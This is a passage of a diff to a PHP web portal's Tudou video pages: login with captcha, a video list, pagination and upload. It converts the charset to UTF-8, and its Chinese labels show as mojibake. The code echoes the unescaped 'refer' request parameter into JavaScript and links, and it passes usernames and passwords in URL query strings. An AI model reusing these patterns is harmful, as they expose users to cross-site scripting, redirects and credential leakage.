+                        &nbspç½‘ç»œè¿æ¥åï¼š<input type="text" class="text" name="vpnname" value="<?php echo strtoupper($regsite);?>" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
+                        &nbspéªŒè¯ç ï¼š<input <?php  $style->input("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="çœ‹ä¸æ¸…æ¥šï¼Ÿæ¢ä¸€ä¸ªï¼"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                         &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
         </tr>   
@@ -2028,7 +3656,7 @@ function changeimg()
 
 <?php 
 function tudou(){
-header('Content-Type: text/html; charset=gb2312');
+header('Content-Type: text/html; charset=utf-8');
 IF(is_wap()){
 ?>
 <!DOCTYPE html 
@@ -2038,13 +3666,13 @@ IF(is_wap()){
 }
 $skincolor = selstyle(trim(request("skin")));
 
-$sCrLf = chr(13) . chr(10); // »Ø³µ + »»ĞĞ
+$sCrLf = chr(13) . chr(10); // å›è½¦ + æ¢è¡Œ
 ?>
 <head>
 <?php 
 $style = new css();
 $style->ico();
-$style->title("X3193 - ÊÓÆµ");
+$style->title("X3193 - è§†é¢‘");
 ?>
 
 <table width="100%" height="100%" align="center" valign="center">
@@ -2058,9 +3686,9 @@ $style->title("X3193 - ÊÓÆµ");
                 <td align="right" style="border:0;<?php $style->selcolor($skincolor,'tdbg');?>">             
                         <?php  
                          IF(!is_wap())
-                        	sellink("Ö÷Ò³|²å¼ş|ËÑË÷|ÓòÃû|FTP|ÓÎÏ·|ÊÓÆµ|¹ÉÆ±|VPN",$skincolor);
+                        	sellink("ä¸»é¡µ|æ’ä»¶|æœç´¢|åŸŸå|FTP|æ¸¸æˆ|è§†é¢‘|æ–‡ç®¡|ç»ˆç«¯|è‚¡ç¥¨|VPN",$skincolor);
                         else
-                        	sellink("Ö÷Ò³|ËÑË÷|ÓòÃû|FTP|ÊÓÆµ",$skincolor);
+                        	sellink("ä¸»é¡µ|æœç´¢|åŸŸå|FTP|è§†é¢‘|æ–‡ç®¡|ç»ˆç«¯",$skincolor);
                         ?>
                 </td>
         </tr>           
@@ -2074,7 +3702,7 @@ $style->title("X3193 - ÊÓÆµ");
 </table>
 <?php 
 
-// Ã¿Ò³ÌõÊı
+// æ¯é¡µæ¡æ•°
 if (trim(request('pagesize')) == "")
         $pagesize = 30;
 elseif (trim(request('pagesize')) > 30)
@@ -2116,11 +3744,11 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                 elseif (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                         If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                 if (trim(request("checkcode")) != ""){
-                                        AlertBack("ËÄÎ»ÑéÖ¤Âë´íÎó£¡" , 1);
+                                        AlertBack("å››ä½éªŒè¯ç é”™è¯¯ï¼" , 1);
                                         break;
                                 }       
                                 elseif (trim(request("checkcode")) == ""){
-                                        AlertBack("ËÄÎ»ÑéÖ¤ÂëÎª¿Õ£¡" , 1);
+                                        AlertBack("å››ä½éªŒè¯ç ä¸ºç©ºï¼" , 1);
                                         break;
                                 }               
                         }
@@ -2168,13 +3796,13 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" height="30" style="<?php $style->selcolor($skincolor,'tdtbg');?>" > ²Ù ×÷ ½á ¹û </td>
+                <td align="center" height="30" style="<?php $style->selcolor($skincolor,'tdtbg');?>" > æ“ ä½œ ç»“ æœ </td>
         </tr>           
 
         <tr class="tdbg">
                 <td align="center" id="result" style="<?php $style->selcolor($skincolor,'tdbg');?>">
-											ËÄÎ»ÑéÖ¤Âë´íÎó£¡
-											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>·µ»Ø</a>
+											å››ä½éªŒè¯ç é”™è¯¯ï¼
+											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>è¿”å›</a>
                 </td>
         </tr>  
 </table> 
@@ -2188,13 +3816,13 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" height="30" style="<?php $style->selcolor($skincolor,'tdtbg');?>" > ²Ù ×÷ ½á ¹û </td>
+                <td align="center" height="30" style="<?php $style->selcolor($skincolor,'tdtbg');?>" > æ“ ä½œ ç»“ æœ </td>
         </tr>           
 
         <tr class="tdbg">
                 <td align="center" id="result" style="<?php $style->selcolor($skincolor,'tdbg');?>">
-											ËÄÎ»ÑéÖ¤Âë´íÎó£¡
-											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>·µ»Ø</a>
+											å››ä½éªŒè¯ç é”™è¯¯ï¼
+											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>è¿”å›</a>
                 </td>
         </tr>  
 </table> 
@@ -2226,8 +3854,8 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                 ?>
 <table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="left" colspan="3" width="25%" height="30" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> [ <a style="" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>ÓÃ»§</a> - <?php echo Base64_decode(trim($_SESSION["tudou"]["uname"]));?> <?php  if (trim($_SESSION["tudou"]["uname"]) != "" && trim($_SESSION["tudou"]["pwd"]) != "") {?> - <a style="color:#444444;"href="<?php echo scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1";?>" target="_self">ÍË³ö</a><?php  } ?> ] </td>
-								<td align="center" colspan="3" width="50%" height="30"  style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ²é Ñ¯ ½á ¹û : ¹² <?php echo $mediaulist['length'];?> Ìõ </td>
+                <td align="left" colspan="3" width="25%" height="30" style="<?php $style->selcolor($skincolor,'tdtbg');?>"> [ <a style="" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>ç”¨æˆ·</a> - <?php echo Base64_decode(trim($_SESSION["tudou"]["uname"]));?> <?php  if (trim($_SESSION["tudou"]["uname"]) != "" && trim($_SESSION["tudou"]["pwd"]) != "") {?> - <a style="color:#444444;"href="<?php echo scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1";?>" target="_self">é€€å‡º</a><?php  } ?> ] </td>
+								<td align="center" colspan="3" width="50%" height="30"  style="<?php $style->selcolor($skincolor,'tdtbg');?>"> æŸ¥ è¯¢ ç»“ æœ : å…± <?php echo $mediaulist['length'];?> æ¡ </td>
 								<td align="left" colspan="3" width="25%" height="30"  style="<?php $style->selcolor($skincolor,'tdtbg');?>"></td>
         </tr>
 </table>
@@ -2253,16 +3881,16 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
         <tr class="tdbg" height="30" >
 
                 <td align="center" width=20% style="<?php $style->selcolor($skincolor,'tdbg');?>">
-                        ±êÌâ
+                        æ ‡é¢˜
                 </td>
                 <td align="center" width=15% style="<?php $style->selcolor($skincolor,'tdbg');?>">
-                        ±êÇ©
+                        æ ‡ç­¾
                 </td>
                 <td align="center" width=15% style="<?php $style->selcolor($skincolor,'tdbg');?>">
-                        ÓÃ»§Ãû£¨êÇ³Æ/ID£©
+                        ç”¨æˆ·åï¼ˆæ˜µç§°/IDï¼‰
                 </td>
                 <td align="center" width=20% style="<?php $style->selcolor($skincolor,'tdbg');?>">
-                        <a style="" href="<?php echo ScriptPath()."?api=tudou&action=".encodeuri('media.search')."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">ËÑË÷</a> <a style="" href="<?php echo ScriptPath()."?api=tudou&action=".encodeuri('media.create')."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">ÉÏ´«</a>
+                        <a style="" href="<?php echo ScriptPath()."?api=tudou&action=".encodeuri('media.search')."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">æœç´¢</a> <a style="" href="<?php echo ScriptPath()."?api=tudou&action=".encodeuri('media.create')."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">ä¸Šä¼ </a>
                 </td> 
         </tr>
                 <?php 
@@ -2308,7 +3936,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                         <?php echo $mediaownername."(".$mediaownernickname."/".$mediaownerid.")";?>
                 </td>
                 <td align="center" style="<?php $i%4==3?$style->selcolor($skincolor,'tdbg'):'';?>" onmouseover="this.style.backgroundColor='#f9f9f9';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='';">
-                        <?php echo "<a style=\"\" href=\"".ScriptPath()."?api=live&action=".encodeuri("account.create")."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainname=".encodeuri($domainname)."\">ÊÕ²Ø</a>";?> <?php echo "<a style=\"\" href=\"".ScriptPath()."?api=live&action=".encodeuri("account.create")."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainname=".encodeuri($domainname)."\">ÍøÊÕ</a>";?>
+                        <?php echo "<a style=\"\" href=\"".ScriptPath()."?api=live&action=".encodeuri("account.create")."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainname=".encodeuri($domainname)."\">æ”¶è—</a>";?> <?php echo "<a style=\"\" href=\"".ScriptPath()."?api=live&action=".encodeuri("account.create")."&authdata=".encodeuri(trim(request("authdata")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainname=".encodeuri($domainname)."\">ç½‘æ”¶</a>";?>
                 </td>
         </tr>   
                 	<?php 
@@ -2319,13 +3947,13 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 </table>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" colspan="3" height="30"  style="<?php $i%4==3?$style->selcolor($skincolor,'tdtbg'):'';?>"> ¹² <?php  echo $totalpage;?> Ò³ µÚ  
+                <td align="center" colspan="3" height="30"  style="<?php $i%4==3?$style->selcolor($skincolor,'tdtbg'):'';?>"> å…± <?php  echo $totalpage;?> é¡µ ç¬¬  
                 <?php 
-                echo $page." Ò³ ".$sCrLf;
+                echo $page." é¡µ ".$sCrLf;
                 if (floor($page)>1)
-                        echo "<a style='' href='".httppath()."?api=tudou&action=".encodeuri(trim(request('action')))."&pagesize=".encodeuri($pagesize)."&page=".($page-1)."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."'>ÉÏÒ»Ò³</a> ";
+                        echo "<a style='' href='".httppath()."?api=tudou&action=".encodeuri(trim(request('action')))."&pagesize=".encodeuri($pagesize)."&page=".($page-1)."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."'>ä¸Šä¸€é¡µ</a> ";
                 if (floor($page)>0 && floor($page)<floor($totalpage))
-                        echo "<a style='' href='".httppath()."?api=tudou&action=".encodeuri(trim(request('action')))."&pagesize=".encodeuri($pagesize)."&page=".($page+1)."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."'>ÏÂÒ»Ò³</a> ";
+                        echo "<a style='' href='".httppath()."?api=tudou&action=".encodeuri(trim(request('action')))."&pagesize=".encodeuri($pagesize)."&page=".($page+1)."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."'>ä¸‹ä¸€é¡µ</a> ";
                 				?>
                 				<input name="page" class='input' border="0" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;text-align:center;" <?php  $style->input("#f9f9f9",""); ?>>
 												<input type="submit" style="<?php $style->selcolor($skincolor,'tdtbg');?>" class="button" name="gotopage" value=" Go ">                 
@@ -2337,7 +3965,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
         </tr>   
 </table>
 <?php 
-                //$gotopage->gotopage($totalpage,httppath()."?api=tudou&action=".encodeuri(trim(request('action')))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&gopage=ok&page=","X3193","ÇëÔÚ¿Õ°×´¦ÊäÈëÒª×ªµ½µÄÒ³Êı");
+                //$gotopage->gotopage($totalpage,httppath()."?api=tudou&action=".encodeuri(trim(request('action')))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&gopage=ok&page=","X3193","è¯·åœ¨ç©ºç™½å¤„è¾“å…¥è¦è½¬åˆ°çš„é¡µæ•°");
                 break;
         case "media.user":
                 if (trim(request("logout")) != ""){
@@ -2360,7 +3988,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                         If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                 if (trim(request("checkcode")) != ""){
                                 			if(!is_wap()){
-                                        AlertBack("ËÄÎ»ÑéÖ¤Âë´íÎó£¡" , 1);
+                                        AlertBack("å››ä½éªŒè¯ç é”™è¯¯ï¼" , 1);
                                         break;
                                       }  
                                       else{ 
@@ -2368,13 +3996,13 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>           
 
         <tr class="tdbg">
                 <td align="center" id="result">
-											ËÄÎ»ÑéÖ¤Âë´íÎó£¡
-											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>·µ»Ø</a>
+											å››ä½éªŒè¯ç é”™è¯¯ï¼
+											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>è¿”å›</a>
                 </td>
         </tr>  
 </table> 
@@ -2384,7 +4012,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                                 }       
                                 elseif (trim(request("checkcode")) == ""){
                                 			if(!is_wap()){
-                                        AlertBack("ËÄÎ»ÑéÖ¤Âë´íÎó£¡" , 1);
+                                        AlertBack("å››ä½éªŒè¯ç é”™è¯¯ï¼" , 1);
                                         break;
                                       }  
                                       else{ 
@@ -2392,13 +4020,13 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>           
 
         <tr class="tdbg">
                 <td align="center" id="result">
-											ËÄÎ»ÑéÖ¤ÂëÎª¿Õ£¡
-											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>·µ»Ø</a>
+											å››ä½éªŒè¯ç ä¸ºç©ºï¼
+											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>è¿”å›</a>
                 </td>
         </tr>  
 </table> 
@@ -2448,7 +4076,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                         If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                 if (trim(request("checkcode")) != ""){
                                 			if(!is_wap()){
-                                        AlertBack("ËÄÎ»ÑéÖ¤Âë´íÎó£¡" , 1);
+                                        AlertBack("å››ä½éªŒè¯ç é”™è¯¯ï¼" , 1);
                                         break;
                                       }  
                                       else{
@@ -2456,13 +4084,13 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
 
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" height="30"  style="<?php $style->selcolor($skincolor,'tdtbg');?>"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center" height="30"  style="<?php $style->selcolor($skincolor,'tdtbg');?>"> æ“ ä½œ ç»“ æœ </td>
         </tr>           
 
         <tr class="tdbg">
                 <td align="center" id="result" style="<?php $style->selcolor($skincolor,'tdbg');?>">
-											ËÄÎ»ÑéÖ¤Âë´íÎó£¡
-											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>·µ»Ø</a>
+											å››ä½éªŒè¯ç é”™è¯¯ï¼
+											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>è¿”å›</a>
                 </td>
         </tr>  
 </table> 
@@ -2471,7 +4099,7 @@ elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                                       }
                                 }       
                                 elseif (trim(request("checkcode")) == ""){
-                                        AlertBack("ËÄÎ»ÑéÖ¤ÂëÎª¿Õ£¡" , 1);
+                                        AlertBack("å››ä½éªŒè¯ç ä¸ºç©ºï¼" , 1);
                                         break;
                                 }               
                         }
@@ -2503,7 +4131,7 @@ function changeimg()
 </script>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="left" colspan="3" width="100%" height="30" style="<?php $style->selcolor($skincolor,'tdbg');?>"> [ <a style="" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>ÓÃ»§</a> - <?php echo Base64_decode(trim($_SESSION["tudou"]["uname"]));?> <?php  if (trim($_SESSION["tudou"]["uname"]) != "" && trim($_SESSION["tudou"]["pwd"]) != "") {?> - <a style="color:#444444;"href="<?php echo scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1";?>" target="_self">ÍË³ö</a><?php  } ?> ] </td>
+                <td align="left" colspan="3" width="100%" height="30" style="<?php $style->selcolor($skincolor,'tdbg');?>"> [ <a style="" href="<?php echo ScriptPath()."?api=tudou&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim('media.ulist'))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))?>" target=_self>ç”¨æˆ·</a> - <?php echo Base64_decode(trim($_SESSION["tudou"]["uname"]));?> <?php  if (trim($_SESSION["tudou"]["uname"]) != "" && trim($_SESSION["tudou"]["pwd"]) != "") {?> - <a style="color:#444444;"href="<?php echo scriptpath()."?api=tudou&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1";?>" target="_self">é€€å‡º</a><?php  } ?> ] </td>
         </tr>
 </table>
 
@@ -2511,9 +4139,9 @@ function changeimg()
         <form enctype="multipart/form-data" action="<?php echo ScriptPath();?>?api=tudou&action=<?php echo encodeuri("media.create")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor;?>&refer=<?php echo encodeuri(trim($_SERVER['HTTP_REFERER']));?>&classid=<?php echo trim(request("calssid"));?>&post=1" method="POST" name="tudou">
         <tr>
                 <td align="center">
-                        <input class="input" border="0" <?php  $style->input("#f9f9f9","","mediatitle");?> style="width:200px;height:30px;" type="text" name="mediatitle" id="mediatitle" value="±êÌâ" onmouseover="document.getElementById('mediatitle').value='';" />
+                        <input class="input" border="0" <?php  $style->input("#f9f9f9","","mediatitle");?> style="width:200px;height:30px;" type="text" name="mediatitle" id="mediatitle" value="æ ‡é¢˜" onmouseover="document.getElementById('mediatitle').value='';" />
 
-                      <input class="input" border="0" <?php  $style->input("#f9f9f9","","mediatags");?> style="width:150px;height:30px;" type="text" name="mediatags" id="mediatags" value="¹Ø¼ü´Ê" /></textarea>
+                      <input class="input" border="0" <?php  $style->input("#f9f9f9","","mediatags");?> style="width:150px;height:30px;" type="text" name="mediatags" id="mediatags" value="å…³é”®è¯" /></textarea>
              
                         <SELECT name="mediaclassid" class="sotoolbar select" border="0" size="1" <?php  $style->selectarea("#f9f9f9",""); ?> style="height:<?php echo browser()=='ie'?'20px':'30px'?>;width:75px;font-size:12px">
                         <?php 
@@ -2530,8 +4158,8 @@ function changeimg()
                         ?>
                         </SELECT> 
 									
-                        <input class="input" border="0" <?php  $style->input("#f9f9f9","","checkcode");?> style="width:80px;height:30px" type="text" maxlength="4" id="checkcode" name="checkcode" maxlength="11" onKeyUp="value=value.replace(/[^0-9a-zA-Z,]/g,'')" value="ÑéÖ¤Âë" />
-                        &nbsp;<a href="javascript:changeimg()" title="¿´²»Çå³ş£¿»»Ò»¸ö£¡"><IMG id="ccimg" height="15" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
+                        <input class="input" border="0" <?php  $style->input("#f9f9f9","","checkcode");?> style="width:80px;height:30px" type="text" maxlength="4" id="checkcode" name="checkcode" maxlength="11" onKeyUp="value=value.replace(/[^0-9a-zA-Z,]/g,'')" value="éªŒè¯ç " />
+                        &nbsp;<a href="javascript:changeimg()" title="çœ‹ä¸æ¸…æ¥šï¼Ÿæ¢ä¸€ä¸ªï¼"><IMG id="ccimg" height="15" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
 
 											<?php
 											if(is_wap()){
@@ -2542,12 +4170,12 @@ function changeimg()
 											?>
                       <input style="width:150px;height:30px;display:none" type="file" name="mediapath" id="mediapath" />	
 											<input class="sotoolbar button" border="0" <?php  $style->input("#f9f9f9","");?> style="width:50px;height:30px;<?php $style->selcolor($skincolor,'tdbg');?>"
-											 type="button" id='fileup' onclick='javascript:document.getElementById("mediapath").click()' value="ÎÄ¼ş" />
+											 type="button" id='fileup' onclick='javascript:document.getElementById("mediapath").click()' value="æ–‡ä»¶" />
 											<?php
 											}
 											?>	
 											
-                        <input border="0" class="sotoolbar button" name="btnSubmit" style="width:<?php echo browser()=='ie'?'60px':'100px'?>;height:<?php echo browser()=='ie'?'20px':'30px'?>;<?php $style->selcolor($skincolor,'tdbg');?>" <?php  $style->input("#f9f9f9","");?> id=bsubmit value="ÉÏ´«ÊÓÆµ" type="submit" />
+                        <input border="0" class="sotoolbar button" name="btnSubmit" style="width:<?php echo browser()=='ie'?'60px':'100px'?>;height:<?php echo browser()=='ie'?'20px':'30px'?>;<?php $style->selcolor($skincolor,'tdbg');?>" <?php  $style->input("#f9f9f9","");?> id=bsubmit value="ä¸Šä¼ è§†é¢‘" type="submit" />
                 </td>                
         </tr>
 </table>
@@ -2556,7 +4184,7 @@ function changeimg()
         <tr>
       	
                 <td align="center" class="tdbg" valign='middle'  style="<?php $style->selcolor($skincolor,'tdtbg');?>">
-                      <textarea class="textarea" border="0" <?php  $style->textarea("#f9f9f9","","mediacontent");?> style="width:100%;height:100%;" type="text" name="mediacontent" id="mediacontent" value="" rows="20" cols="80" />ÊÓÆµ½éÉÜ</textarea>         
+                      <textarea class="textarea" border="0" <?php  $style->textarea("#f9f9f9","","mediacontent");?> style="width:100%;height:100%;" type="text" name="mediacontent" id="mediacontent" value="" rows="20" cols="80" />è§†é¢‘ä»‹ç»</textarea>         
                 </td>  
 <script src="//cdn.ckeditor.com/4.5.9/full/ckeditor.js"></script>
             <script>
@@ -2573,7 +4201,7 @@ function changeimg()
                         If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                 if (trim(request("checkcode")) != ""){
                                 			if(!is_wap()){
-                                        AlertBack("ËÄÎ»ÑéÖ¤Âë´íÎó£¡" , 1);
+                                        AlertBack("å››ä½éªŒè¯ç é”™è¯¯ï¼" , 1);
                                         break;
                                       }  
                                       else{
@@ -2581,13 +4209,13 @@ function changeimg()
 
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center"> ²Ù ×÷ ½á ¹û </td>
+                <td align="center"> æ“ ä½œ ç»“ æœ </td>
         </tr>           
 
         <tr class="tdbg">
                 <td align="center" id="result">
-											ËÄÎ»ÑéÖ¤Âë´íÎó£¡
-											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>·µ»Ø</a>
+											å››ä½éªŒè¯ç é”™è¯¯ï¼
+											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>è¿”å›</a>
                 </td>
         </tr>  
 </table> 
@@ -2596,7 +4224,7 @@ function changeimg()
                                       }
                                 }       
                                 elseif (trim(request("checkcode")) == ""){
-                                        AlertBack("ËÄÎ»ÑéÖ¤ÂëÎª¿Õ£¡" , 1);
+                                        AlertBack("å››ä½éªŒè¯ç ä¸ºç©ºï¼" , 1);
                                         break;
                                 }               
                         }
@@ -2613,7 +4241,7 @@ function changeimg()
 		                ?>
 <table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
         <tr class="tdtbg">
-                <td align="center" height="30" > ²Ù ×÷ ½á ¹û </td>
+                <td align="center" height="30" > æ“ ä½œ ç»“ æœ </td>
         </tr>           
                 		<?php 
                 		if ($mediaupload['result'] != 'ok' && $mediaupload['content'] != 'ok'){
@@ -2621,7 +4249,7 @@ function changeimg()
                 		?>
         <tr class="tdbg">
                 <td align="center" id="result" height="30" >
-                        ÊÓÆµÉÏ´«Ê§°Ü£¡<?php echo ($timeout/1000)?> Ãëºó·µ»ØÉÏÒ»Ò³
+                        è§†é¢‘ä¸Šä¼ å¤±è´¥ï¼<?php echo ($timeout/1000)?> ç§’åè¿”å›ä¸Šä¸€é¡µ
                 </td>
         </tr>   
                 		<?php       
@@ -2632,7 +4260,7 @@ function changeimg()
                 		?>
         <tr class="tdbg">
                 <td align="center" id="result" height="30" >
-                        ÊÓÆµÉÏ´«Ê§°Ü£¡<?php echo ($timeout/1000)?> <a href="<?php  echo trim(request("refer"))?>">·µ»ØÉÏÒ»Ò³</a>
+                        è§†é¢‘ä¸Šä¼ å¤±è´¥ï¼<?php echo ($timeout/1000)?> <a href="<?php  echo trim(request("refer"))?>">è¿”å›ä¸Šä¸€é¡µ</a>
                 </td>
         </tr>   
                 		<?php  
@@ -2643,7 +4271,7 @@ function changeimg()
                 		?>
         <tr class="tdbg">
                 <td align="center" id="result" height="30" >
-                        ÊÓÆµÉÏ´«³É¹¦£¡<?php echo ($timeout/1000)?> Ãëºó·µ»ØÉÏÒ»Ò³
